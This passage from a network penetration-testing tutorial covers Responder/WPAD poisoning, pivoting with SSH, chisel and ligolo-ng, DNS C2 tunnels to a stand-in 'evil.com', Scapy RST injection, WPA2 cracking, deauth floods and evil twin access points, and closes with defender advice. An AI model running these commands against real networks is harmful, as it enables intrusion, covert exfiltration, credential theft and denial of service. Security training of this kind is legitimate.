### WPAD Exploitation

Web Proxy Auto-Discovery Protocol. Windows machines automatically look
for a proxy configuration file at `http://wpad.<domain>/wpad.dat`. If
DNS doesn't have a WPAD record, the machine falls back to LLMNR/NBT-NS.

Responder serves a malicious WPAD file that routes all HTTP traffic
through your proxy. Now you're intercepting web traffic passively.

```bash
# Run inside WSL2

# Responder with WPAD enabled (default — -w flag)
sudo responder -I eth0 -wrf
# -w = enable WPAD rogue proxy (serves malicious wpad.dat)
# -r = enable answers for NetBIOS wredir suffix queries
# -f = enable fingerprinting (fingerprints OS of responding hosts)
```

---

## Tunneling and Pivoting

You've compromised one machine on the internal network. Now you need
to reach systems that aren't directly accessible from your attack box.
Tunneling encapsulates your traffic inside allowed protocols. Pivoting
uses the compromised host as a relay to reach deeper networks.

### SSH Tunneling

The Swiss Army knife of tunneling. Three modes.
**SSH client is built into Windows 10/11** — use PowerShell directly,
no WSL2 needed.

**Local Port Forward** — Access a remote service through your local machine:
```bash
# Works in PowerShell (Windows native SSH) OR WSL2

# Forward local port 8080 to internal_server:80 through the compromised host
# -L local_port:destination:destination_port
ssh -L 8080:internal_server:80 user@compromised_host

# Now http://localhost:8080 reaches internal_server:80
# The compromised host makes the connection to internal_server on your behalf
# Your traffic to internal_server is encrypted inside the SSH tunnel

# Multiple forwards in one command:
# Forward both a web server and an RDP session through the tunnel
ssh -L 8080:web_server:80 -L 3389:rdp_server:3389 user@compromised_host
```

**Remote Port Forward** — Expose your local service through the remote machine:
```bash
# Make your local port 4444 accessible as port 9999 on the compromised host
# -R remote_port:localhost:local_port
ssh -R 9999:localhost:4444 user@compromised_host

# Now anyone connecting to compromised_host:9999 reaches your localhost:4444
# Useful for reverse shells when direct connections are blocked
```

**Dynamic Port Forward (SOCKS Proxy)** — Turn the SSH connection into a
full SOCKS proxy:
```bash
# Create a SOCKS proxy on local port 1080
# -D = dynamic port forwarding (SOCKS4/5)
ssh -D 1080 user@compromised_host

# Configure your tools to use SOCKS proxy at localhost:1080
# ALL traffic through the proxy exits from the compromised host
# No need to specify individual port forwards

# Use with proxychains (WSL2):
# Edit /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn internal_network/24
proxychains curl http://internal_web_app

# Windows alternative — configure system proxy or use Proxifier (paid)
# or FoxyProxy browser extension for web traffic
```

#### Expected Output

**SSH local forward success:**
```
# No output — SSH connects silently. Test by opening localhost:8080 in a browser.
# If the internal site loads, the tunnel is working.
```

**Failure looks like:** `bind: Address already in use` — port 8080 is taken on your local machine. Change to a different local port: `ssh -L 9090:internal_server:80 ...`

### DNS Tunneling

DNS traffic is almost never blocked. Even heavily filtered networks
allow DNS queries to resolve hostnames. Abuse this to exfiltrate data
or maintain C2 channels.

**How it works**:
1. You control a domain (e.g., `evil.com`) and its authoritative DNS server
2. The client encodes data in DNS queries: `base64data.evil.com`
3. Your DNS server receives the query, decodes the data
4. Response data is encoded in DNS TXT or CNAME records
5. Slow as fuck — DNS has payload size limits — but it WORKS through
   almost any firewall

```bash
# Run inside WSL2

# iodine — IP-over-DNS tunnel
# Server (on your DNS server for evil.com — needs to be a real public server):
# -f = foreground, -c = disable client IP check, -P secretpass = password
# 10.0.0.1 = tunnel subnet, tunnel.evil.com = your subdomain
iodined -f -c -P secretpass 10.0.0.1 tunnel.evil.com

# Client (on compromised machine):
# -f = foreground, -P secretpass = same password, tunnel.evil.com = server subdomain
iodine -f -P secretpass tunnel.evil.com

# Now you have a virtual interface (dns0) with IP 10.0.0.2
# Full IP connectivity through DNS queries. Slow but invisible.

# dnscat2 — C2 over DNS (requires Ruby server — see WINDOWS SETUP section)
# Server:
dnscat2-server evil.com

# Client (on compromised machine):
# --dns = DNS server config, domain = your controlled domain
./dnscat --dns=server=<dns_server>,domain=evil.com
```

### ICMP Tunneling

Same principle as DNS tunneling but over ICMP (ping). The data payload
of ICMP echo requests/replies carries your tunnel traffic.

```bash
# Run inside WSL2

# ptunnel-ng — TCP over ICMP
# Server (on compromised host or your server):
# -r = restrict to specific target IP, -R = target port (22 = SSH)
ptunnel-ng -r<target_ip> -R22

# Client (on attacker — your WSL2 box):
# -p = ptunnel server (compromised host), -l = local listen port
# -r = destination target IP, -R = destination port
ptunnel-ng -p<compromised_host> -l2222 -r<target_ip> -R22
# SSH through the ICMP tunnel — connects to localhost:2222 which exits at target:22
ssh -p 2222 user@localhost
# SSH connection tunneled through ICMP to the target
```

### Chisel — Modern HTTP Tunneling

Chisel is a fast TCP/UDP tunnel transported over HTTP, secured via SSH.
Single binary, cross-platform. This is the modern standard for pivoting.

```bash
# Attacker side — run chisel server on YOUR Windows machine (PowerShell)
# chisel.exe downloaded during WINDOWS SETUP
# --reverse = allow reverse port forwards from clients
.\chisel.exe server -p 8080 --reverse

# OR run in WSL2:
chisel server -p 8080 --reverse

# Client (on compromised host — upload chisel binary first):
# R:socks = create a reverse SOCKS proxy on attacker port 1080
chisel client <attacker_ip>:8080 R:socks

# Now you have a SOCKS proxy on attacker port 1080
# All traffic through it exits from the compromised host

# Forward a specific port (e.g., RDP on an internal server):
# R:local_port:destination:destination_port
chisel client <attacker_ip>:8080 R:3389:internal_rdp:3389

# Chisel through a corporate web proxy (if only HTTP/HTTPS allowed out):
chisel client --proxy http://corporate_proxy:8080 <attacker>:443 R:socks
```

#### Expected Output

**Chisel server (attacker side):**
```
2026/06/27 10:00:00 server: Reverse tunnelling enabled
2026/06/27 10:00:00 server: Fingerprint abc123...
2026/06/27 10:00:00 server: Listening on http://0.0.0.0:8080
```

**Chisel client (compromised host) connects:**
```
2026/06/27 10:00:05 server: session#1: Client Handshake...
2026/06/27 10:00:05 server: session#1: tun: Created
```

**Failure looks like:** `connection refused` on the client — check Windows Firewall on the attacker machine. Add an inbound rule: `netsh advfirewall firewall add rule name="chisel" dir=in action=allow protocol=TCP localport=8080`

### Ligolo-ng — Agent-Based Pivoting

Ligolo-ng creates a virtual network interface on your attacker machine
that routes directly into the target network. No SOCKS configuration
needed — just add routes and use your tools normally.

```bash
# Proxy runs on YOUR machine (Windows) — download from WINDOWS SETUP
# -selfcert = generate self-signed cert, -laddr = listen address
ligolo-proxy.exe -selfcert -laddr 0.0.0.0:11601

# Agent (on compromised host — upload ligolo-agent binary):
# -connect = attacker IP and port, -ignore-cert = accept self-signed cert
ligolo-agent -connect <attacker_ip>:11601 -ignore-cert

# In ligolo proxy console (interactive):
session           # select the agent session
ifconfig          # see internal network interfaces on the compromised host
start             # start the tunnel

# On attacker (Windows PowerShell — add route to internal network):
# This makes 10.10.10.0/24 directly reachable from your Windows machine
route add 10.10.10.0 mask 255.255.255.0 0.0.0.0 if <ligolo_interface_number>
# Find interface number: Get-NetAdapter in PowerShell

# WSL2 equivalent:
sudo ip route add 10.10.10.0/24 dev ligolo

# Now you can directly access 10.10.10.0/24 from your attack box
# nmap, curl, smbclient — everything works natively. No proxychains.
```

### Proxychains Configuration

When using SOCKS proxies for pivoting, proxychains forces any application
through the proxy. **Proxychains is WSL2 only — there is no native Windows
equivalent.** On Windows, use Proxifier or configure each tool's proxy
settings individually.

```bash
# /etc/proxychains4.conf (WSL2)
# Edit with: sudo nano /etc/proxychains4.conf

strict_chain        # use proxies in order, fail if any are down
proxy_dns           # route DNS through proxy too (prevents DNS leaks)
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080    # your SOCKS proxy (chisel, SSH -D, or ligolo)

# Chain multiple proxies (pivot through multiple hosts):
# socks5 127.0.0.1 1080   # first pivot
# socks5 127.0.0.1 1081   # second pivot (set up on first pivot host)

# Usage:
proxychains nmap -sT -Pn -p 80,443,445 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.50 -u admin -p password
proxychains smbclient \\\\10.10.10.50\\share -U admin
```

#### Expected Output

**proxychains nmap success:**
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.9x...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.50:80  ...  OK
PORT   STATE SERVICE
80/tcp open  http
```

**Failure looks like:** `[proxychains] Strict chain ... TIMEOUT` — your SOCKS proxy isn't running or the port is wrong. Verify chisel/SSH tunnel is active first.

---

## Packet Crafting With Scapy

Scapy lets you build packets from scratch. Every field, every flag,
every byte — you control it all. This is how you test firewall rules,
fuzz protocols, and build custom exploits.

**Scapy runs natively on Windows.** Open PowerShell as Administrator,
then `python` directly. WSL2 also works.

### Basic Packet Construction

```python
# Run in Python (Windows PowerShell as Admin, or WSL2)
from scapy.all import *

# Build an IP packet — dst = destination IP
ip = IP(dst="10.0.0.100")

# Build a TCP SYN packet
# dport = destination port, flags="S" = SYN flag only, seq = initial sequence number
tcp = TCP(dport=80, flags="S", seq=1000)

# Stack layers with / (slash operator in Scapy = layer encapsulation)
packet = ip/tcp
packet.show()    # inspect all fields — dumps every header value

# Send and receive (sr = send/receive, sr1 = send one, wait for one response)
# timeout=2 = give up after 2 seconds if no response
response = sr1(packet, timeout=2)

# Send without waiting for response (useful for floods)
send(packet)

# Send at Layer 2 (specify ethernet header too — needed for ARP, layer-2 attacks)
eth = Ether(dst="ff:ff:ff:ff:ff:ff")   # broadcast MAC
sendp(eth/ip/tcp)                        # sendp = send at layer 2 (Ethernet)
```

### Practical Examples

```python
# Run in Python as Administrator (Windows) or with sudo (WSL2)
from scapy.all import *

# ---- SYN scan (like nmap -sS) ----
def syn_scan(target, ports):
    for port in ports:
        # Send SYN, wait for response (timeout=1 second per port)
        resp = sr1(IP(dst=target)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
        if resp and resp.haslayer(TCP):
            if resp[TCP].flags == 0x12:    # 0x12 = SYN+ACK = port is OPEN
                print(f"[+] Port {port}: OPEN")
                # Send RST to cleanly close — don't leave half-open connections
                send(IP(dst=target)/TCP(dport=port, flags="R", seq=resp[TCP].ack), verbose=0)
            elif resp[TCP].flags == 0x14:  # 0x14 = RST+ACK = port is CLOSED
                pass  # closed, move on silently
        else:
            print(f"[?] Port {port}: FILTERED (no response)")

syn_scan("10.0.0.100", range(1, 1025))

# ---- ARP scan (discover hosts on LAN) ----
def arp_scan(network):
    # srp = send/receive at Layer 2 | Ether broadcast + ARP who-has
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                     timeout=2, verbose=0)
    for sent, received in ans:
        # psrc = protocol source (IP), hwsrc = hardware source (MAC)
        print(f"[+] {received.psrc} is at {received.hwsrc}")

arp_scan("192.168.1.0/24")

# ---- ICMP ping sweep ----
def ping_sweep(network_prefix):
    for i in range(1, 255):
        target = f"{network_prefix}.{i}"
        # ICMP() default = echo request (ping)
        resp = sr1(IP(dst=target)/ICMP(), timeout=0.5, verbose=0)
        if resp:
            print(f"[+] {target} is alive")

ping_sweep("192.168.1")

# ---- DNS query crafting ----
# rd=1 = recursion desired, qd = question section, qname = domain to resolve
dns_req = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_req, timeout=2, verbose=0)
print(response[DNS].summary())

# ---- TCP RST injection (kill someone's connection) ----
# Requires sniffing to get current sequence number first
def rst_inject(src_ip, dst_ip, src_port, dst_port, seq_num):
    # Craft RST packet spoofing the source — looks like it came from src_ip
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port,
                                          flags="R", seq=seq_num)
    send(pkt, verbose=0)
    print(f"[+] RST sent: {src_ip}:{src_port} → {dst_ip}:{dst_port}")
```

#### Expected Output

**syn_scan:**
```
[+] Port 22: OPEN
[+] Port 80: OPEN
[?] Port 81: FILTERED (no response)
```

**arp_scan:**
```
[+] 192.168.1.1 is at 00:11:22:33:44:55
[+] 192.168.1.50 is at aa:bb:cc:dd:ee:ff
```

**Failure looks like:** `Operation not permitted` (Linux/WSL2) or `[Errno 13] Permission denied` (Windows) — Scapy needs to send raw packets. On Windows: run PowerShell as Administrator. On WSL2: run with `sudo python script.py`.

**Failure looks like:** `OSError: [WinError 10013]` on Windows — Npcap not installed. Download from https://npcap.com/#download and install before using Scapy.

### Protocol Fuzzing With Scapy

```python
# Run as Administrator / sudo
from scapy.all import *
import random

# Fuzz TCP options — send packets with random TCP option fields
# fuzz() randomizes all fields not explicitly set
def fuzz_tcp_options(target, port):
    for i in range(1000):
        # fuzz() randomizes fields within valid ranges for the layer
        pkt = IP(dst=target)/fuzz(TCP(dport=port))
        send(pkt, verbose=0)

# Fuzz DNS — send malformed DNS queries to test DNS server robustness
def fuzz_dns(target):
    for i in range(1000):
        # Generate random domain name of random length (1-255 chars)
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(1, 255)))
        # qtype = random DNS record type (A=1, NS=2, CNAME=5, etc.)
        pkt = IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=name,
              qtype=random.randint(1, 255)))
        send(pkt, verbose=0)

# Craft packets that should be dropped by firewalls
# Test if they actually ARE dropped — useful for firewall rule validation
def firewall_test(target):
    # Christmas tree packet (all flags set — should be blocked by modern firewalls)
    send(IP(dst=target)/TCP(dport=80, flags="FSRPAUEC"), verbose=0)
    # NULL packet (no flags — RFC says drop if port closed)
    send(IP(dst=target)/TCP(dport=80, flags=""), verbose=0)
    # Invalid flag combination (SYN+ECE — unusual, may confuse stateless filters)
    send(IP(dst=target)/TCP(dport=80, flags="SE"), verbose=0)
```

---

## Wireless Attacks

Brief — just enough to understand the attack surface. Wireless adds
a physical-layer dimension that wired networks don't have.

**Windows 11 note:** The built-in WiFi adapter CANNOT be put into monitor
mode. You need a **USB WiFi adapter** that supports monitor mode
(recommended: Alfa AWUS036ACH or similar) AND it must be passed through
to WSL2 using `usbipd-win` (see WINDOWS SETUP section). All commands below
run inside WSL2 only.

### WPA2 Handshake Capture and Cracking

WPA2 uses a four-way handshake to derive the session key from the
Pre-Shared Key (PSK). If you capture this handshake, you can brute-force
the PSK offline.

```bash
# Run inside WSL2 with USB WiFi adapter passed through

# 1. Put wireless adapter in monitor mode
# wlan0 = your USB WiFi adapter (check with: iw dev)
sudo airmon-ng start wlan0
# Adapter becomes wlan0mon

# 2. Scan for target networks (Ctrl+C to stop after seeing your target)
sudo airodump-ng wlan0mon
# Note the BSSID (MAC) and channel of your target

# 3. Focus capture on target network
# -c = channel number, --bssid = target MAC, -w capture = save to capture-XX.cap
sudo airodump-ng -c <channel> --bssid <target_bssid> -w capture wlan0mon

# 4. Force a client to reconnect (deauthentication attack)
# Disconnects a client so they re-authenticate, generating a fresh handshake
# -0 5 = send 5 deauth frames, -a = target AP BSSID, -c = specific client MAC
sudo aireplay-ng -0 5 -a <target_bssid> -c <client_mac> wlan0mon

# 5. Wait for "WPA handshake: <bssid>" in airodump-ng output
# The handshake is saved to capture-01.cap

# 6. Crack with aircrack-ng (CPU — slow)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 7. Convert to hashcat format for GPU cracking (MUCH faster on your Windows GPU)
hcxpcapngtool -o hash.hc22000 capture-01.cap
# Run hashcat on Windows (native GPU support — faster than WSL2):
# hashcat.exe -m 22000 hash.hc22000 rockyou.txt
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
# -m 22000 = WPA2 PMKID/handshake mode
```

#### Expected Output

**airodump-ng (scanning):**
```
 CH  6 ][ Elapsed: 10 s ][ 2026-06-27 10:00

 BSSID              PWR  Beacons    #Data  CH   MB   ENC CIPHER  AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45       15        3   6  130   WPA2 CCMP   PSK  TargetNet
```

**airodump-ng (capturing handshake):**
```
WPA handshake: AA:BB:CC:DD:EE:FF
```
That "WPA handshake" line in the top-right is your signal. The .cap file is now useful.

**aircrack-ng success:**
```
KEY FOUND! [ Password123 ]
```

**Failure looks like:** `No valid WPA handshakes found` in aircrack-ng — the capture didn't contain a full handshake. Run the deauth again while airodump-ng is capturing.

### Deauthentication Attacks

802.11 management frames (including deauth) are NOT encrypted or
authenticated in WPA2. Anyone can send them. This means:

- You can disconnect any client from any network at any time
- You can force reconnections to capture handshakes
- You can create a denial-of-service against WiFi networks
- WPA3 fixes this with Protected Management Frames (PMF)

```bash
# Run inside WSL2 with monitor-mode USB WiFi adapter

# Deauth flood — kick everyone off a network (broadcast deauth)
# -0 0 = continuous deauth (0 = unlimited), -a = target AP
sudo aireplay-ng -0 0 -a <target_bssid> wlan0mon

# Targeted deauth — kick one specific client
# -0 10 = send 10 deauth frames, -c = specific client MAC
sudo aireplay-ng -0 10 -a <target_bssid> -c <client_mac> wlan0mon

# With mdk4 (more flexible deauth options):
# d = deauth mode, -B = target BSSID
sudo mdk4 wlan0mon d -B <target_bssid>
```

### Evil Twin Attack

Create a fake access point with the same SSID as a legitimate network.
Clients connect to yours instead (because your signal is stronger or
the real AP is being deauth'd).

```bash
# Run inside WSL2

# Using hostapd-mana for the evil twin AP:
# Create /etc/hostapd-mana.conf with:
# interface=wlan1      ← your second USB WiFi adapter (one for monitor, one for AP)
# driver=nl80211
# ssid=TargetNetworkName
# hw_mode=g
# channel=6
# auth_algs=1
# wpa=2
# wpa_passphrase=doesntmatter
# wpa_key_mgmt=WPA-PSK
# wpa_pairwise=CCMP

# Start the evil twin:
sudo hostapd-mana /etc/hostapd-mana.conf

# Set up DHCP for connected victims (dnsmasq serves IP addresses to clients):
sudo dnsmasq -C /etc/dnsmasq.conf

# Route traffic through your machine (Linux iptables — WSL2 only)
# MASQUERADE = NAT — makes victim traffic appear to come from your machine
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
# Enable IP forwarding so victim traffic actually passes through
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

# Now capture credentials with a captive portal, MITM their traffic,
# or serve malicious content
```

---

## Putting It All Together — Attack Chains

Isolated techniques are demonstrations. Chained techniques are operations.
Here's how these pieces combine in real engagements:

### External to Internal

```
1. DNS enumeration → discover subdomains → find dev.target.com
2. Port scan dev.target.com → find exposed service on 8443
3. Service enumeration → identify vulnerable application
4. Exploit → shell on DMZ host
5. Pivot → SSH tunnel through DMZ to internal network
6. Internal scan → discover domain controller, file servers
7. Responder → capture NTLM hashes from broadcast poisoning
8. Crack hashes → domain user credentials
9. Lateral movement → more access, more hashes
10. Domain admin → game over
```

### Internal Network (Assume Breach)

```
1. ARP scan → discover live hosts
2. Responder → poison LLMNR/NBT-NS → capture NTLMv2 hashes
3. Crack or relay hashes → access to first machine
4. Dump local credentials → find cached domain creds
5. Pivot through compromised hosts → reach segregated networks
6. Kerberoast → crack service account hashes
7. Find domain admin credentials → full domain compromise
```

The network is not a destination. It's the highway between targets.
Every technique in this chapter is a way to control that highway —
who can drive on it, where they go, and what they see along the way.

---

## DEFENDER TAKEAWAY

You built the attacker's toolkit. Now flip it. Here's what a Monday-morning
defender does with this knowledge:

- **Disable LLMNR and NBT-NS immediately.** These two protocols are the
  easiest free lunch in Windows pentesting. Group Policy: Computer Configuration
  → Administrative Templates → Network → DNS Client → Turn off multicast
  name resolution = Enabled. NBT-NS: Network Adapter properties → TCP/IPv4 →
  Advanced → WINS tab → Disable NetBIOS over TCP/IP. No legitimate traffic
  breaks. Zero cost.

- **Enable Dynamic ARP Inspection (DAI) on managed switches.** DAI validates
  ARP packets against a DHCP snooping binding table. Fake ARP replies get
  dropped at the switch port before they can poison anyone's cache. Config
  is vendor-specific but the feature exists on every enterprise switch.

- **Monitor for Responder-style attacks via Windows Event IDs.**
  Watch Event ID **4625** (failed logon) on your DC — a spike of NTLMv2
  failures from multiple workstations pointing to a single destination IP
  is Responder in action. Also watch **Event ID 5156** (Windows Filtering
  Platform connection allowed) for unexpected SMB connections to non-server
  machines.

- **Block outbound DNS to everything except your authorised DNS servers.**
  DNS tunneling only works if the victim can reach an attacker-controlled
  DNS server. Firewall rule: allow UDP/TCP 53 outbound to your two corporate
  DNS IPs only. Drop everything else. This breaks iodine, dnscat2, and most
  DNS exfiltration in one rule.

- **Deploy 802.1X on all wired switch ports.** Without 802.1X port
  authentication, anyone who plugs into an ethernet jack gets network access.
  ARP spoofing, MAC flooding, and rogue device attacks all require being on
  the network first. 802.1X forces certificate or credential authentication
  before a port is activated.

- **Enable WPA3 on all corporate WiFi.** WPA3 mandates Protected Management
  Frames (PMF), which cryptographically authenticates deauthentication frames.
  Deauth attacks and evil twin attacks become dramatically harder. WPA2 with
  PMF enabled is also acceptable as a transitional step.

- **Run Responder in analysis mode on your own network regularly.**
  `sudo responder -I eth0 -A` (analyze only — doesn't answer, just listens).
  If you see LLMNR/NBT-NS queries, you have broadcast name resolution enabled.
  If you see hashes arriving, something is already attacking you.

- **Windows-specific: enable SMB signing.** SMB relay attacks (where an
  attacker relays NTLM auth to a second server) only work if SMB signing is
  not required. Group Policy: Computer Configuration → Windows Settings →
  Security Settings → Local Policies → Security Options → Microsoft network
  server: Digitally sign communications (always) = Enabled. Event ID **5140**
  (network share access) logs will show you if relay attempts are happening.

- **Log and alert on nmap-style scans.** A SYN scan against your network
  generates Event ID **5156** (connection allowed) and **5157** (connection
  blocked) at high volume from a single source IP. Set a threshold alert:
  more than 50 unique destination ports from one source in 60 seconds =
  automatic quarantine of that source IP on your NAC/firewall.

---

## Summary — Key Takeaways

- **Every OSI layer is an attack surface.** From wiretapping (Layer 1) to
  application protocol abuse (Layer 7). Security must exist at EVERY layer
  because attackers can operate at ANY layer.

- **ARP has zero authentication.** ARP poisoning is trivial on any local
  network without ARP inspection. This gives you MITM position — which
  enables DNS spoofing, credential capture, traffic modification.

- **The TCP three-way handshake is exploitable.** SYN floods exploit the
  half-open state. Sequence number knowledge enables hijacking and RST
  injection. Port scanning exploits the different responses to different
  flag combinations.

- **LLMNR/NBT-NS poisoning is the easiest win on internal Windows
  networks.** Responder captures NTLM hashes from normal user behavior.
  No exploitation required. No malware. Just answering broadcast questions.

- **DNS tunneling works through almost any firewall.** If DNS is allowed
  (and it almost always is), you have a covert channel. Slow but reliable.
  Same principle applies to ICMP tunneling.

- **Pivoting converts one compromised host into access to the entire
  internal network.** SSH tunneling, chisel, ligolo-ng, proxychains —
  know at least two methods cold.

- **Scapy gives you complete control over packet construction.** Custom
  scans, protocol fuzzing, firewall testing, exploit development —
  when nmap and standard tools aren't enough, build the packet yourself.

- **Wireless adds a broadcast medium where everyone hears everything.**
  WPA2 handshakes are capturable. Management frames are unauthenticated.
  Evil twins work because clients trust SSID names.

- **Individual techniques are tools. Chained techniques are operations.**
  Recon feeds MITM, MITM feeds credential capture, credentials feed
  lateral movement. Each link in the chain multiplies the impact.

- **On Windows 11: WSL2 is mandatory for most of this chapter.** Nmap
  and Scapy run natively. Everything else needs WSL2 + a USB WiFi adapter
  for wireless attacks. Install WSL2 first, install tools second, then
  come back and run the drills.
